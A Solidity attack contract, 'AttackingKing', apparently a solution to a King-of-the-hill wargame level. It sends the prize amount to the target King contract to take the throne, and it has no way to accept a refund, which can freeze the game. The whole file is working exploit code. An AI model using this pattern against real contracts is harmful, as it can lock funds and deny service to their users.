// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;
    King private king;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
        king = King(payable(_contractAddress));
    }

    function hackContract() external {
        console.log("---> attackers contract balance:", address(this).balance);
        address(king).call{value: king.prize()}("");
    }
}
